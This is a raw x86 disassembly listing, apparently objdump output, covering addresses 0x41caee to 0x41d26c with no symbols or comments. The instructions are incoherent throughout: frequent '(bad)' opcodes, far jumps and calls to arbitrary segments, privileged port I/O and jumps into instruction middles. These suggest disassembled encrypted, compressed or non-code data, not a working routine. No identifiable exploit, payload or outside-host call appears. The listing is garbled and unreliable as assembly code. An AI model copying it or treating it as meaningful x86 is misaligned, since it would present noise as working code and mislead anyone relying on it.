  41caee:	xchg   esi,eax
  41caef:	xor    DWORD PTR [edx-0x5b],edx
  41caf2:	repz aam 0x8e
  41caf5:	test   al,0x93
  41caf7:	ins    BYTE PTR es:[edi],dx
  41caf8:	mov    ds,WORD PTR fs:[esi+0x63aa93e4]
  41caff:	xchg   BYTE PTR [esi+edi*2],ch
  41cb02:	retf   
  41cb03:	in     eax,dx
  41cb04:	arpl   bx,ax
  41cb06:	retf   
  41cb07:	xchg   edi,eax
  41cb08:	loopne 0x41cb35
  41cb0a:	xchg   edi,eax
  41cb0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb0c:	fs push ecx
  41cb0e:	loope  0x41cb14
  41cb10:	loopne 0x41cb5b
  41cb12:	sbb    dh,BYTE PTR [edx]
  41cb14:	ror    BYTE PTR [edx-0x415b630],cl
  41cb1a:	(bad)  
  41cb1b:	es and edx,esi
  41cb1e:	sbb    ebp,ebx
  41cb20:	mov    ebx,0x63a2e1c
  41cb25:	(bad)  
  41cb26:	xor    edi,edx
  41cb28:	cmp    eax,0xb4de04d4
  41cb2d:	cmp    al,0xe3
  41cb2f:	dec    ebp
  41cb30:	retf   
  41cb31:	sbb    edi,esp
  41cb33:	in     eax,dx
  41cb34:	aad    0xd
  41cb36:	push   0xffffffe9
  41cb38:	stc    
  41cb39:	or     al,0xe9
  41cb3b:	test   al,0x56
  41cb3d:	adc    edx,DWORD PTR [esi]
  41cb3f:	loopne 0x41cb33
  41cb41:	jmp    0x44a6:0x982e7969
  41cb48:	bound  esp,QWORD PTR [edi-0x5e33924c]
  41cb4e:	mov    ebx,0xf3024c60
  41cb53:	push   ss
  41cb54:	dec    ebp
  41cb55:	or     BYTE PTR ds:[eax+0x4c],cl
  41cb59:	adc    DWORD PTR ds:0x19f4c480,ecx
  41cb5f:	ins    BYTE PTR es:[edi],dx
  41cb60:	or     dh,cl
  41cb62:	jnp    0x41cbc7
  41cb64:	cmp    DWORD PTR ss:[edi],edx
  41cb67:	nop
  41cb68:	mov    WORD PTR [ebx],ss
  41cb6a:	not    BYTE PTR [ebp-0x7e]
  41cb6d:	inc    ebp
  41cb6e:	jne    0x41cb70
  41cb70:	jp     0x41cb1d
  41cb72:	iret   
  41cb73:	cwde   
  41cb74:	arpl   si,cx
  41cb76:	fisub  WORD PTR [ebp-0xf]
  41cb79:	jo     0x41cb7d
  41cb7b:	or     esi,DWORD PTR ds:0xf4c2055
  41cb81:	adc    al,0xea
  41cb83:	ret    0xe4df
  41cb86:	je     0x41cb6b
  41cb88:	xor    BYTE PTR [edi-0xbe602d0],0x7b
  41cb8f:	dec    ebp
  41cb90:	mov    bh,0x65
  41cb92:	gs icebp 
  41cb94:	ds mov ch,0xfb
  41cb97:	jbe    0x41cbe6
  41cb99:	ret    
  41cb9a:	out    dx,al
  41cb9b:	(bad)  
  41cb9c:	push   ds
  41cb9d:	mov    ebx,0xaf2c7b5b
  41cba2:	mov    fs,WORD PTR [ecx]
  41cba4:	or     dl,BYTE PTR [edi]
  41cba6:	mov    ebx,0xc44b103d
  41cbab:	jno    0x41cc12
  41cbad:	cli    
  41cbae:	xor    al,0xaf
  41cbb0:	pop    edx
  41cbb1:	jp     0x41cbd0
  41cbb3:	loope  0x41cc07
  41cbb5:	xor    ebp,0x4f9e6b29
  41cbbb:	and    ebx,ebx
  41cbbd:	sbb    esi,DWORD PTR [ebx+0x7c]
  41cbc0:	loope  0x41cbfa
  41cbc2:	jb     0x41cc38
  41cbc4:	or     eax,0x2fe2e182
  41cbc9:	aad    0xfc
  41cbcb:	rol    DWORD PTR [ebp-0x21a3c639],1
  41cbd1:	sar    al,0x90
  41cbd4:	and    eax,DWORD PTR [esi]
  41cbd6:	gs ds in eax,dx
  41cbd9:	push   0xda74c0db
  41cbde:	bound  ebx,QWORD PTR [ebp+eax*8+0x4b188b38]
  41cbe5:	xor    ebx,ecx
  41cbe7:	mov    esi,0xbfddccfb
  41cbec:	clc    
  41cbed:	inc    ebx
  41cbee:	iret   
  41cbef:	ret    
  41cbf0:	mov    si,0xdba8
  41cbf4:	or     esp,edx
  41cbf6:	add    BYTE PTR [esi+0x7bcfb0ef],bl
  41cbfc:	out    dx,eax
  41cbfd:	mov    ebp,0x6dce0057
  41cc02:	lahf   
  41cc03:	mov    bl,0xeb
  41cc05:	pop    ss
  41cc06:	ja     0x41cc86
  41cc08:	dec    edx
  41cc09:	lods   al,BYTE PTR ds:[esi]
  41cc0a:	mov    ebx,0xb10aacb1
  41cc0f:	ficom  WORD PTR [eax]
  41cc11:	arpl   WORD PTR [esi+ebx*2-0x60b151eb],sp
  41cc18:	es aam 0xd
  41cc1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc1c:	test   BYTE PTR [edx-0x37],dh
  41cc1f:	arpl   WORD PTR [eax+ebx*1],di
  41cc22:	adc    eax,0xbad8b1bc
  41cc27:	inc    esp
  41cc28:	lods   eax,DWORD PTR ds:[esi]
  41cc29:	arpl   WORD PTR [esi+eax*1-0x74],sp
  41cc2d:	int    0x12
  41cc2f:	mov    ch,0xa9
  41cc31:	sub    BYTE PTR [edx+eiz*4+0x36710e30],ah
  41cc38:	add    DWORD PTR [ecx-0x6da2ee3a],0x16541a6c
  41cc42:	pop    ebx
  41cc43:	jp     0x41cc35
  41cc45:	mov    al,ds:0x404c9a16
  41cc4a:	jno    0x41cc9a
  41cc4c:	sbb    BYTE PTR [eax+0x4b],bh
  41cc4f:	xchg   ebp,eax
  41cc50:	jne    0x41cc50
  41cc52:	pop    es
  41cc53:	push   esi
  41cc54:	lock dec esi
  41cc56:	sub    DWORD PTR [eax+eiz*4+0x32],ebx
  41cc5a:	push   eax
  41cc5b:	cmp    DWORD PTR [ebp-0x3b8b4fee],esp
  41cc61:	shl    BYTE PTR [edx-0x2456b325],1
  41cc67:	mov    ss,WORD PTR [edi+0xd]
  41cc6a:	outs   dx,DWORD PTR ds:[esi]
  41cc6b:	xor    bh,BYTE PTR fs:[edi-0x7d80de40]
  41cc72:	adc    BYTE PTR [ecx*8-0x45a7cf2c],bl
  41cc79:	(bad)  
  41cc7a:	and    al,0xec
  41cc7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc7d:	cmp    DWORD PTR [ebp-0x56],esi
  41cc80:	sbb    BYTE PTR [ebx],ah
  41cc82:	xchg   esp,eax
  41cc83:	mov    esi,0xe089f0a5
  41cc88:	arpl   sp,ax
  41cc8a:	and    DWORD PTR [edx+0x11],ebp
  41cc8d:	xor    eax,0x2ae7c58
  41cc92:	in     al,dx
  41cc93:	loopne 0x41ccbd
  41cc95:	mov    cl,0xc
  41cc97:	inc    ecx
  41cc98:	jge    0x41cc44
  41cc9a:	pop    esi
  41cc9b:	push   0x62
  41cc9d:	sti    
  41cc9e:	inc    ebp
  41cc9f:	push   ebp
  41cca0:	mov    edx,0xa3b56818
  41cca5:	mov    DWORD PTR ds:0x6078ce9d,ebp
  41ccab:	mov    ebx,0x66033760
  41ccb0:	sahf   
  41ccb1:	inc    esp
  41ccb2:	dec    dx
  41ccb4:	xor    eax,0xf39bed7d
  41ccb9:	repnz retf 0xd70d
  41ccbd:	xchg   ebp,eax
  41ccbe:	lock aad 0xa3
  41ccc1:	enter  0x1ec0,0xa2
  41ccc5:	xor    al,0xcb
  41ccc7:	int3   
  41ccc8:	fldenv [ebp+0x57]
  41cccb:	lahf   
  41cccc:	inc    ebp
  41cccd:	sub    al,0x4c
  41cccf:	fld    TBYTE PTR [ecx]
  41ccd1:	dec    ecx
  41ccd2:	loope  0x41cd42
  41ccd4:	xchg   ecx,eax
  41ccd5:	or     ch,BYTE PTR [edi]
  41ccd7:	retf   0x3181
  41ccda:	cmp    ebx,DWORD PTR [ebp+0x839be]
  41cce0:	test   DWORD PTR [eax],edx
  41cce2:	push   edx
  41cce3:	imul   BYTE PTR [ebx+edx*2+0x6c]
  41cce7:	(bad)  
  41cce8:	xchg   edx,eax
  41cce9:	enter  0xfd31,0x4e
  41cced:	jp     0x41cd52
  41ccef:	jle    0x41cd5f
  41ccf1:	mov    ch,0x4d
  41ccf3:	jb     0x41cd3e
  41ccf5:	mov    al,0x7
  41ccf7:	jmp    0x41cd45
  41ccf9:	out    0xf5,al
  41ccfb:	out    dx,eax
  41ccfc:	arpl   WORD PTR [edx],ax
  41ccfe:	cmp    eax,0x18335881
  41cd03:	test   al,0xe6
  41cd05:	adc    cl,0xe6
  41cd08:	cmp    BYTE PTR [edi-0x5e13ef11],bh
  41cd0e:	jg     0x41cd49
  41cd10:	loopne 0x41cd86
  41cd12:	mov    ecx,cs
  41cd14:	out    0xc1,eax
  41cd16:	add    ebp,eax
  41cd18:	mov    eax,ds:0x859a0c0c
  41cd1d:	leave  
  41cd1e:	out    dx,eax
  41cd1f:	cmp    edx,DWORD PTR [ebx]
  41cd21:	in     eax,dx
  41cd22:	popf   
  41cd23:	dec    edi
  41cd24:	push   es
  41cd25:	sbb    al,BYTE PTR [edi+0x3b1892e3]
  41cd2b:	call   0xbfae:0x10314359
  41cd32:	imul   ecx,DWORD PTR [eax+0x3b5994af],0x76bd8e5
  41cd3c:	pop    esp
  41cd3d:	jb     0x41cd5e
  41cd3f:	jecxz  0x41cd85
  41cd41:	jmp    0xd64b19ee
  41cd46:	shr    BYTE PTR [ebx*4+0x627f5be7],cl
  41cd4d:	dec    esp
  41cd4e:	jne    0x41cd98
  41cd50:	cwde   
  41cd51:	out    dx,al
  41cd52:	into   
  41cd53:	add    BYTE PTR [ecx-0x14a4dd15],ah
  41cd59:	jae    0x41cce7
  41cd5b:	xor    eax,0x42b6391c
  41cd60:	ins    BYTE PTR es:[edi],dx
  41cd61:	test   BYTE PTR [edi],bh
  41cd63:	stc    
  41cd64:	push   ecx
  41cd65:	(bad)  
  41cd66:	scas   eax,DWORD PTR es:[edi]
  41cd67:	inc    dl
  41cd69:	(bad)  
  41cd6a:	fstp   DWORD PTR ds:0x54bb106d
  41cd70:	sahf   
  41cd71:	pushf  
  41cd72:	in     eax,dx
  41cd73:	mov    ch,0x34
  41cd75:	mov    bl,0x16
  41cd77:	arpl   WORD PTR [edx+eiz*2],cx
  41cd7a:	or     eax,0x3b5109c6
  41cd7f:	(bad)  
  41cd81:	fnstcw WORD PTR [eax-0x35]
  41cd84:	mov    DWORD PTR [ebx],edx
  41cd86:	jg     0x41cd3d
  41cd88:	and    al,0xb
  41cd8b:	add    al,BYTE PTR [edx]
  41cd8d:	ds pop edi
  41cd8f:	(bad)  
  41cd90:	(bad)  
  41cd91:	mov    ebp,0xf72bdef7
  41cd96:	cmp    eax,0xcfdb7d8c
  41cd9b:	cld    
  41cd9c:	(bad)  
  41cd9d:	sbb    esp,DWORD PTR [edx-0x74]
  41cda0:	(bad)  
  41cda1:	jge    0x41cdf4
  41cda3:	mov    eax,0x74a9f5b1
  41cda8:	aaa    
  41cda9:	lahf   
  41cdaa:	ja     0x41cde4
  41cdac:	cmp    esp,DWORD PTR [ebp-0x59]
  41cdaf:	pop    ebp
  41cdb0:	(bad)  
  41cdb1:	sub    al,0x75
  41cdb3:	adc    al,0x63
  41cdb5:	inc    ebx
  41cdb6:	push   ecx
  41cdb7:	sbb    BYTE PTR [esp+esi*4],dh
  41cdba:	pop    eax
  41cdbb:	outs   dx,DWORD PTR ds:[esi]
  41cdbc:	sub    DWORD PTR [edx+0x312adb12],ecx
  41cdc2:	mov    dh,0xf8
  41cdc4:	sub    dh,BYTE PTR [ecx]
  41cdc6:	cmc    
  41cdc7:	push   esp
  41cdc8:	fwait
  41cdc9:	and    al,0x72
  41cdcb:	adc    DWORD PTR [ebx],esp
  41cdcd:	and    DWORD PTR [esi-0x52bc517c],esi
  41cdd3:	ret    
  41cdd4:	and    ebp,DWORD PTR [eax-0x3f693f31]
  41cdda:	or     al,0xa5
  41cddc:	fwait
  41cddd:	inc    edi
  41cdde:	add    BYTE PTR [edx-0x11be794d],0xca
  41cde5:	xor    ebx,DWORD PTR [edx+0x148b615b]
  41cdeb:	push   eax
  41cdec:	into   
  41cded:	inc    edx
  41cdee:	pop    edx
  41cdef:	inc    edi
  41cdf0:	jp     0x41ce22
  41cdf2:	jo     0x41ce0e
  41cdf4:	xor    al,0x3d
  41cdf6:	(bad)  
  41cdf7:	and    BYTE PTR [ecx],0x80
  41cdfa:	or     bl,BYTE PTR [edi-0x2c6f8127]
  41ce00:	(bad)
  41ce03:	push   ebx
  41ce04:	inc    ebx
  41ce05:	in     eax,dx
  41ce06:	xchg   esp,eax
  41ce07:	xchg   ebp,eax
  41ce08:	retf   0xc4f1
  41ce0b:	mov    ch,0x73
  41ce0d:	mov    ah,0x8d
  41ce0f:	loopne 0x41cdd8
  41ce11:	xchg   BYTE PTR [ebx+0x47],ah
  41ce14:	sbb    bl,BYTE PTR [ecx+ebx*4-0x38]
  41ce18:	cmp    al,0x5e
  41ce1a:	xlat   BYTE PTR ds:[ebx]
  41ce1b:	lock push edx
  41ce1d:	rcr    BYTE PTR [ecx-0x197cfb78],1
  41ce23:	sub    DWORD PTR ds:0x5fd66550,edi
  41ce29:	popf   
  41ce2a:	ins    DWORD PTR es:[edi],dx
  41ce2b:	inc    edx
  41ce2c:	inc    ecx
  41ce2d:	sub    al,0x41
  41ce2f:	sbb    eax,DWORD PTR [edx-0x64]
  41ce32:	and    edx,edx
  41ce34:	rcl    DWORD PTR [ecx+0x10],1
  41ce37:	jmp    0xa271da6c
  41ce3c:	mov    esp,0xaf406d64
  41ce41:	mov    dl,0xab
  41ce43:	call   0xbda5:0x6a04e82e
  41ce4a:	neg    BYTE PTR ds:0x7918b37b
  41ce50:	jmp    FWORD PTR [esi+0x10aac7cf]
  41ce56:	lods   eax,DWORD PTR ds:[esi]
  41ce57:	mov    ecx,0x43cf3ab3
  41ce5c:	mov    bl,0x65
  41ce5e:	cs dec esi
  41ce60:	xchg   edi,eax
  41ce61:	cwde   
  41ce62:	inc    esp
  41ce63:	pop    eax
  41ce64:	xchg   ah,dl
  41ce66:	fsub   DWORD PTR [ebx]
  41ce68:	jmp    0x8e656a8
  41ce6d:	and    BYTE PTR [edx+ecx*2-0x3301ed97],ah
  41ce74:	loop   0x41ce1d
  41ce76:	in     al,0x69
  41ce78:	mov    esp,0xfafd3b9a
  41ce7d:	adc    eax,0x4bc61756
  41ce82:	dec    edx
  41ce83:	out    dx,al
  41ce84:	jne    0x41cea5
  41ce86:	dec    ebp
  41ce87:	push   eax
  41ce88:	push   ebp
  41ce89:	aam    0x99
  41ce8b:	and    al,0xec
  41ce8d:	xchg   ecx,eax
  41ce8e:	add    DWORD PTR [eax-0x19a15503],edi
  41ce94:	or     ch,BYTE PTR [eax+edx*4]
  41ce97:	sar    DWORD PTR [ecx+ecx*8+0x44],0xc9
  41ce9c:	cmp    DWORD PTR [esi-0x5a],edi
  41ce9f:	cmp    esi,ebp
  41cea1:	dec    edi
  41cea2:	inc    ebx
  41cea3:	(bad)  
  41cea5:	sub    al,0xee
  41cea7:	stos   DWORD PTR es:[edi],eax
  41cea8:	div    BYTE PTR [ebx]
  41ceaa:	pop    es
  41ceab:	test   bh,0x23
  41ceae:	mov    ebp,0x2e8d7fac
  41ceb3:	fadd   DWORD PTR [esi-0x55d665c3]
  41ceb9:	or     edx,esi
  41cebb:	and    DWORD PTR [esi+eiz*1+0x5b4b8da8],esp
  41cec2:	pushf  
  41cec3:	mov    esi,0xd4e69579
  41cec8:	ss retf 
  41ceca:	jg     0x41ceaf
  41cecc:	add    DWORD PTR [esi],ecx
  41cece:	stc    
  41cecf:	or     ebx,DWORD PTR [esi+esi*4]
  41ced2:	xchg   BYTE PTR ds:0x494b18eb,dh
  41ced8:	sbb    ecx,DWORD PTR ds:0xb552974d
  41cede:	popf   
  41cedf:	jo     0x41ce72
  41cee1:	xor    esp,DWORD PTR [edi]
  41cee3:	(bad)  
  41cee4:	jl     0x41cee2
  41cee6:	adc    eax,0x7f713c2b
  41ceeb:	push   ds
  41ceec:	icebp  
  41ceed:	push   ss
  41ceee:	push   edx
  41ceef:	jl     0x41cea8
  41cef1:	jno    0x41cf68
  41cef3:	retf   0xd1da
  41cef6:	call   0xb3b7:0xb08fa793
  41cefd:	pop    es
  41cefe:	lahf   
  41ceff:	push   ds
  41cf00:	pusha  
  41cf01:	or     eax,0x5f834ba8
  41cf06:	bound  ecx,QWORD PTR [eax]
  41cf08:	mov    BYTE PTR [ebx],al
  41cf0a:	jno    0x41ce8e
  41cf0c:	cmc    
  41cf0d:	xchg   esi,eax
  41cf0e:	fcomp  DWORD PTR [ecx-0x3c]
  41cf11:	jbe    0x41cec7
  41cf13:	mov    bl,0xad
  41cf15:	mov    ch,0x97
  41cf17:	mov    esp,0xf6bf2de2
  41cf1c:	out    0xa7,al
  41cf1e:	mov    esi,0xe9ff7beb
  41cf23:	jmp    0xd196c91a
  41cf28:	pop    esi
  41cf29:	lock in eax,dx
  41cf2b:	add    eax,0xcbcf0071
  41cf30:	clc    
  41cf31:	inc    ecx
  41cf32:	dec    esi
  41cf33:	jle    0x41cf19
  41cf35:	and    esp,esi
  41cf37:	jge    0x41cf28
  41cf39:	pop    ecx
  41cf3a:	pop    ds
  41cf3b:	into   
  41cf3c:	out    0xed,eax
  41cf3e:	aas    
  41cf3f:	jae    0x41cfb6
  41cf41:	mov    cl,0x52
  41cf43:	push   esp
  41cf44:	mov    ss,ecx
  41cf46:	mov    eax,0x1094e9a2
  41cf4b:	neg    al
  41cf4d:	idiv   BYTE PTR [edi+0x46]
  41cf50:	sub    BYTE PTR [edi-0x631fcd28],ah
  41cf56:	test   DWORD PTR [esi+0x3ac11ac3],ebp
  41cf5c:	dec    ecx
  41cf5d:	sbb    bh,dh
  41cf5f:	imul   ebp,DWORD PTR [esi+0x2c],0x74213abb
  41cf66:	repz mov ah,0xea
  41cf69:	sbb    DWORD PTR ds:0x20ed04f1,eax
  41cf6f:	inc    esi
  41cf70:	mov    ds:0xb823180f,al
  41cf75:	inc    esp
  41cf76:	jecxz  0x41cfdf
  41cf78:	inc    esi
  41cf79:	xchg   ebx,eax
  41cf7a:	inc    eax
  41cf7b:	sub    eax,DWORD PTR [eax+0x48]
  41cf7e:	lea    eax,[edx+0x3]
  41cf81:	out    dx,eax
  41cf82:	adc    cl,BYTE PTR [esi-0x60]
  41cf85:	or     DWORD PTR [edi-0x54],eax
  41cf88:	popf   
  41cf89:	popa   
  41cf8a:	xchg   edx,eax
  41cf8b:	pop    ebx
  41cf8c:	pop    edx
  41cf8d:	inc    ebx
  41cf8e:	mov    BYTE PTR [eax+0x47],al
  41cf91:	push   esp
  41cf92:	or     DWORD PTR [eax+0x7c4a1265],0x5b
  41cf99:	jecxz  0x41cf3f
  41cf9b:	mov    al,ds:0x1b5092d5
  41cfa0:	pushf  
  41cfa1:	das    
  41cfa2:	cwde   
  41cfa3:	in     al,dx
  41cfa4:	jns    0x41cf34
  41cfa6:	sbb    al,0x69
  41cfa8:	xor    BYTE PTR [esi-0x3c],ah
  41cfab:	cdq    
  41cfac:	jecxz  0x41d02d
  41cfae:	or     esp,DWORD PTR [esi+0x1b]
  41cfb1:	or     al,0xeb
  41cfb3:	sbb    dh,BYTE PTR gs:[edi-0x6b]
  41cfb7:	retf   0xc11c
  41cfba:	leave  
  41cfbb:	adc    BYTE PTR [eax],0x1b
  41cfbe:	sub    al,0x43
  41cfc0:	mov    esp,0x36e998e9
  41cfc5:	inc    ecx
  41cfc6:	cmp    eax,0x21a44068
  41cfcb:	mov    al,0x4e
  41cfcd:	inc    esp
  41cfce:	jo     0x41d002
  41cfd0:	(bad)  
  41cfd1:	retf   0x912
  41cfd4:	call   0x21740003
  41cfd9:	shl    BYTE PTR [eax-0x30c5d126],cl
  41cfdf:	push   0x27
  41cfe1:	pushf  
  41cfe2:	fistp  WORD PTR [edx+esi*2-0x4e9d3288]
  41cfe9:	or     ebp,DWORD PTR [ebp-0x2d5b4104]
  41cfef:	scas   eax,DWORD PTR es:[edi]
  41cff0:	js     0x41d043
  41cff2:	or     al,0xe5
  41cff4:	repnz adc ah,BYTE PTR [ecx]
  41cff7:	es mov edx,0xbe6146b3
  41cffd:	mov    ebx,0xa72647c9
  41d002:	cwde   
  41d003:	pop    es
  41d004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d005:	pop    esp
  41d006:	pop    ecx
  41d007:	out    0xb4,al
  41d009:	dec    ebx
  41d00a:	icebp  
  41d00b:	mov    dh,0x35
  41d00d:	sti    
  41d00e:	sti    
  41d00f:	pop    eax
  41d010:	xchg   esp,eax
  41d011:	data16 fdiv DWORD PTR [edi-0x5a17fb46]
  41d018:	push   ebp
  41d019:	fcom   QWORD PTR [edx-0xb41542e]
  41d01f:	xchg   esi,eax
  41d020:	or     al,0x29
  41d022:	xchg   ebp,eax
  41d023:	cld    
  41d024:	(bad)  
  41d025:	into   
  41d026:	test   eax,0xef318b13
  41d02b:	iret   
  41d02c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d02d:	leave  
  41d02e:	aas    
  41d02f:	sub    bh,BYTE PTR [ebp-0x2]
  41d032:	sbb    eax,0x89972033
  41d037:	cmp    eax,0x3c9448aa
  41d03c:	adc    DWORD PTR [eax],ebp
  41d03e:	push   edi
  41d03f:	add    ecx,DWORD PTR [esp+eax*2+0x73]
  41d043:	xchg   edi,eax
  41d044:	loopne 0x41d004
  41d046:	dec    ecx
  41d047:	outs   dx,BYTE PTR ds:[si]
  41d049:	push   edi
  41d04a:	cli    
  41d04b:	jo     0x41d056
  41d04d:	jg     0x41d0a7
  41d04f:	cmp    BYTE PTR [edx+0x7bef13fd],dl
  41d055:	add    eax,0x87bfc8fa
  41d05a:	sbb    BYTE PTR [ecx+ebp*8],cl
  41d05d:	cld    
  41d05e:	xchg   edx,eax
  41d05f:	adc    ebp,ecx
  41d061:	mov    ebx,0x636bf328
  41d066:	mov    al,BYTE PTR [esi+edi*4]
  41d069:	jmp    0x3bc:0x80f16eef
  41d070:	out    0x66,eax
  41d072:	pop    esp
  41d073:	out    0x96,eax
  41d075:	pop    eax
  41d076:	mov    ch,0x9e
  41d078:	add    DWORD PTR [esi-0x69dcbcf6],eax
  41d07e:	mov    dl,BYTE PTR [esi]
  41d080:	and    DWORD PTR [eax-0x268d709a],esi
  41d086:	pop    esp
  41d087:	fs sti 
  41d089:	fldenv ds:0xcedd4cd0
  41d08f:	clc    
  41d090:	mov    BYTE PTR [esi],al
  41d092:	in     eax,0xd2
  41d094:	mov    ecx,0x553aaa1d
  41d099:	cwde   
  41d09a:	rcr    BYTE PTR [ecx+ecx*8],cl
  41d09d:	add    BYTE PTR [esi+0x31],dl
  41d0a0:	push   esi
  41d0a1:	or     DWORD PTR [ebp+0x4c],ebx
  41d0a4:	stos   DWORD PTR es:[edi],eax
  41d0a5:	mov    edi,0x9e75831
  41d0aa:	inc    ebp
  41d0ab:	inc    eax
  41d0ac:	mov    edx,0xf981b50e
  41d0b1:	fs jmp 0x41d0ef
  41d0b4:	(bad)  
  41d0b5:	loopne 0x41d05e
  41d0b7:	fistp  QWORD PTR [ecx+0x2f]
  41d0ba:	outs   dx,DWORD PTR ds:[esi]
  41d0bb:	jns    0x41d090
  41d0bd:	jecxz  0x41d13e
  41d0bf:	adc    eax,0x2b05e04e
  41d0c4:	add    edi,DWORD PTR [esi-0x4a]
  41d0c7:	xor    al,0xe0
  41d0c9:	int3   
  41d0ca:	jge    0x41d094
  41d0cc:	ret    
  41d0cd:	mov    bh,0x57
  41d0cf:	repnz mov cl,0xdf
  41d0d2:	stc    
  41d0d3:	enter  0x8bf7,0xf1
  41d0d7:	addr16 mov cl,dl
  41d0da:	jnp    0x41d13b
  41d0dc:	cmp    DWORD PTR [edx+0x7d6763ae],edi
  41d0e2:	pop    es
  41d0e3:	ja     0x41d151
  41d0e5:	xchg   DWORD PTR [ebx+0x37],ebp
  41d0e8:	sahf   
  41d0e9:	inc    ebp
  41d0ea:	stos   DWORD PTR es:[edi],eax
  41d0eb:	push   ss
  41d0ec:	push   edi
  41d0ed:	sbb    ah,dl
  41d0ef:	lds    ecx,FWORD PTR [esp+0x17c9850b]
  41d0f6:	add    BYTE PTR [ecx],0xab
  41d0f9:	dec    edx
  41d0fa:	pushf  
  41d0fb:	int    0x16
  41d0fd:	add    esi,DWORD PTR [eax]
  41d0ff:	dec    esp
  41d100:	cdq    
  41d101:	les    edi,FWORD PTR ds:0x70e5db62
  41d107:	bound  esp,QWORD PTR ss:[edx+0x30c935a1]
  41d10e:	and    al,0x26
  41d110:	mov    eax,0xe2a4d839
  41d115:	pop    ebx
  41d116:	sbb    BYTE PTR [ecx+0x63513630],ah
  41d11c:	lea    esi,[eax]
  41d11e:	jb     0x41d175
  41d120:	push   0x3
  41d122:	int3   
  41d123:	adc    al,0x60
  41d125:	ins    BYTE PTR es:[edi],dx
  41d126:	call   0x3316:0xf37893ca
  41d12d:	jae    0x41d14f
  41d12f:	loopne 0x41d0fb
  41d131:	rcl    BYTE PTR [ecx+0x728dc751],0x7
  41d138:	mov    bl,0xe9
  41d13a:	xor    eax,0xf58d6146
  41d13f:	jmp    0x64e4:0x5f6eae59
  41d146:	jns    0x41d17b
  41d148:	(bad)  
  41d149:	xchg   esi,eax
  41d14a:	inc    esi
  41d14b:	xchg   esp,eax
  41d14c:	cs push edx
  41d14e:	mov    ecx,0xafcdeca3
  41d153:	xor    ecx,ebp
  41d155:	push   0x6a
  41d157:	cmp    eax,0x56779891
  41d15c:	xor    BYTE PTR [ebp-0x36],al
  41d15f:	aad    0x45
  41d161:	add    edx,DWORD PTR [ecx-0x6d1f9ad2]
  41d167:	sbb    cl,dh
  41d169:	xchg   edx,eax
  41d16a:	xabort 0x10
  41d16d:	arpl   WORD PTR [ebx-0x59],ax
  41d170:	cmp    eax,DWORD PTR [edx+ebx*1-0x64]
  41d174:	sbb    al,0xc6
  41d176:	mov    al,BYTE PTR [edi]
  41d178:	xor    esp,ebx
  41d17a:	push   esi
  41d17b:	ret    
  41d17c:	lods   al,BYTE PTR ds:[esi]
  41d17d:	xchg   ebx,eax
  41d17e:	fmul   st(3),st
  41d180:	mov    al,ds:0xaf3f9749
  41d185:	jo     0x41d15d
  41d187:	enter  0x8a3e,0xef
  41d18b:	cli    
  41d18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d18d:	mov    eax,ds:0x4da1964
  41d192:	cld    
  41d193:	repnz or dl,BYTE PTR [edx]
  41d196:	sbb    eax,DWORD PTR [esp+ebx*1-0x7b]
  41d19a:	sbb    al,BYTE PTR [edx-0x5b76134d]
  41d1a0:	xchg   BYTE PTR [ecx+0x527b7b9c],ch
  41d1a6:	jp     0x41d13c
  41d1a8:	mov    ecx,0x4f19a052
  41d1ad:	xor    DWORD PTR [esi+eiz*4],0xe5945d0b
  41d1b4:	cli    
  41d1b5:	sbb    BYTE PTR [ebx-0x226e5bcb],0x46
  41d1bc:	mov    al,ds:0xb85d490d
  41d1c1:	iret   
  41d1c2:	les    ecx,FWORD PTR [edi]
  41d1c4:	and    al,dh
  41d1c6:	imul   esi,esi,0x499c2c87
  41d1cc:	aas    
  41d1cd:	cld    
  41d1ce:	adc    ebx,DWORD PTR [ebx]
  41d1d0:	jae    0x41d175
  41d1d2:	popa   
  41d1d3:	pop    ds
  41d1d4:	out    0xb3,eax
  41d1d6:	dec    edi
  41d1d7:	stc    
  41d1d8:	aad    0x3
  41d1da:	lods   eax,DWORD PTR ds:[esi]
  41d1db:	ret    0xa726
  41d1de:	adc    esp,DWORD PTR [esi]
  41d1e0:	popf   
  41d1e1:	pop    esp
  41d1e2:	dec    esp
  41d1e3:	daa    
  41d1e4:	xchg   ebp,eax
  41d1e5:	push   edx
  41d1e6:	cs jp  0x41d250
  41d1e9:	nop
  41d1ea:	pushf  
  41d1eb:	dec    edx
  41d1ec:	int3   
  41d1ed:	push   ebp
  41d1ee:	add    DWORD PTR [ebp-0x3f04dc6f],0x40
  41d1f5:	lods   eax,DWORD PTR ss:[esi]
  41d1f7:	sahf   
  41d1f8:	pop    ecx
  41d1f9:	mov    BYTE PTR [ecx-0x51],cl
  41d1fc:	stos   DWORD PTR es:[edi],eax
  41d1fd:	retf   0xeb86
  41d200:	ret    
  41d201:	sub    DWORD PTR [esi-0x3a132c0f],esp
  41d207:	or     DWORD PTR [ebx],esp
  41d209:	mov    cl,0xa9
  41d20b:	mov    DWORD PTR [edi+eax*2],0xe953081
  41d212:	and    ebx,DWORD PTR [esi-0x64c98736]
  41d218:	xor    DWORD PTR [ebx+0x57],ebx
  41d21b:	add    al,BYTE PTR [ebp+0x59]
  41d21e:	mov    cl,0x18
  41d220:	mov    esp,ebx
  41d222:	repz pop ss
  41d224:	adc    BYTE PTR [esi-0x6b1d9685],ah
  41d22a:	adc    dl,al
  41d22c:	fadd   DWORD PTR [ecx-0x84816f3]
  41d232:	dec    edx
  41d233:	iret   
  41d234:	(bad)  
  41d235:	fisub  WORD PTR ss:[eax-0x7e]
  41d239:	sar    DWORD PTR [edx-0x79],0x86
  41d23d:	mov    gs,WORD PTR [esi-0xa4ce967]
  41d243:	sub    ebp,DWORD PTR [edi+0x7]
  41d246:	out    dx,al
  41d247:	inc    BYTE PTR [edx-0x230c0ff4]
  41d24d:	mov    esi,0x7a00c60
  41d252:	add    bh,bh
  41d254:	imul   eax,DWORD PTR [eax-0x20],0x7d
  41d258:	pusha  
  41d259:	push   ds
  41d25a:	cmp    DWORD PTR [edx+0x7e5fe07c],eax
  41d260:	clc    
  41d261:	inc    esp
  41d262:	mov    esi,fs
  41d264:	inc    edi
  41d265:	pop    ebp
  41d266:	jmp    0x54b690f1
  41d26b:	push   ebp
  41d26c:	inc    ecx
